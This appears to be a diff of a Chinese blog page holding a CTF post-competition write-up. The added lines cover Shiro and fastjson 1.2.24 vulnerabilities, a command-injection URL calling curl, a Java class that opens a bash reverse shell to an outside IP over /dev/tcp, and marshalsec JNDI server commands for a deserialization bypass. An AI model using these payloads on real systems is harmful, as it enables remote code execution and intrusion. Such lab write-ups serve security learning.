@@ -47,8 +47,8 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 
 <!-- title、keywords、desc关键字 -->
 
-  <title>留言板</title>
-  <meta name="title" content="留言板" />
+  <title>关于</title>
+  <meta name="title" content="关于" />
 
 
 
@@ -118,6 +118,7 @@ daovoice('update');
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240313135846653.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240313140331034.png">
 <meta property="og:image" content="https://img.hzy2003628.top/49a427d0f27ee1bc8fdaf9480f26f668.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240416215753031.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240313230120531.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240313230200560.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240313122416348.png">
@@ -132,7 +133,7 @@ daovoice('update');
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240311165304128.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240311165424731.png">
 <meta property="article:published_time" content="2024-03-13T06:36:39.000Z">
-<meta property="article:modified_time" content="2024-03-23T10:08:19.390Z">
+<meta property="article:modified_time" content="2024-04-16T14:00:58.988Z">
 <meta property="article:author" content="故里">
 <meta property="article:tag" content="赛后复盘">
 <meta property="article:tag" content="CTF">
@@ -378,7 +379,7 @@ daovoice('update');
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-23 18:08:19" itemprop="dateModified" datetime="2024-03-23T18:08:19+08:00">2024-03-23</time>
+                <time title="修改时间：2024-04-16 22:00:58" itemprop="dateModified" datetime="2024-04-16T22:00:58+08:00">2024-04-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -422,14 +423,14 @@ daovoice('update');
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>24k</span>
+              <span>25k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>22 分钟</span>
+              <span>23 分钟</span>
             </span>
 
         </div>
@@ -725,6 +726,18 @@ public class gogo &#123;
 <p>预留后门</p>
 <pre><code class="hljs plaintext">Process process = Runtime.getRuntime().exec(v1da);</code></pre>
 <p>直接命令执行</p>
+<pre><code class="hljs plaintext">shiro未授权访问 Shiro &lt; 1.7.0均存在，题目存在未授权访问</code></pre>
+<pre><code class="hljs plaintext">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+    &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;
+    &lt;version&gt;1.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+    &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;
+    &lt;version&gt;1.5.0&lt;/version&gt;
+&lt;/dependency&gt;</code></pre>
+<pre><code class="hljs plaintext">fastjson的1.2.24版本存在反序列化漏洞</code></pre>
 <pre><code class="hljs plaintext">http://localhost:8080/;/md01m?v1da=curl http://192.168.44.130/</code></pre>
 <img src="https://img.hzy2003628.top/image-20240313135527539.png" alt="image-20240313135527539" style="zoom:200%;">
 <h2 id="任意地址请求">任意地址请求</h2>
@@ -760,7 +773,29 @@ public class gogo &#123;
 <h3 id="attack">attack</h3>
 <p>漏洞点如下</p>
 <img src="https://img.hzy2003628.top/49a427d0f27ee1bc8fdaf9480f26f668.png" alt="49a427d0f27ee1bc8fdaf9480f26f668" style="zoom:200%;">
-<p>过滤了常用的俩个链子JdbcRowSetImpl和TemplatesImpl，没打成</p>
+<p>过滤了常用的俩个链子JdbcRowSetImpl和TemplatesImpl，还可以利用JndiRefForwardingDataSource，垃圾字符填充绕过字符限制</p>
+<p>反弹shell的类</p>
+<pre><code class="hljs plaintext">import java.lang.Runtime;
+import java.lang.Process;
+
+public class re &#123;
+    static&#123;
+        try&#123;
+            String str = &quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/47.101.170.17/5553; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;;
+            String[] strs = new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,str&#125;;
+            Process e = Runtime.getRuntime().exec(strs);
+            e.waitFor();
+        &#125;catch (Exception e)&#123;
+            //
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="hljs plaintext">javac re.java</code></pre>
+<img src="https://img.hzy2003628.top/image-20240416215753031.png" alt="image-20240416215753031" style="zoom:200%;">
+<pre><code class="hljs plaintext">java -cp -jar marshalsec-0.0.3-SNAPSHOT-all.jar 
+
+java -cp -jar marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/889#re 5553</code></pre>
 <h2 id="任意文件上传">任意文件上传</h2>
 <pre><code class="hljs plaintext">@PostMapping(&quot;/upload&quot;)
 @ResponseBody
@@ -1854,7 +1889,7 @@ print(base64.b64encode(pickle.dumps(RCE())))</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">21:59</span>
+    <span title="站点阅读时长">22:01</span>
 </div>
 
 
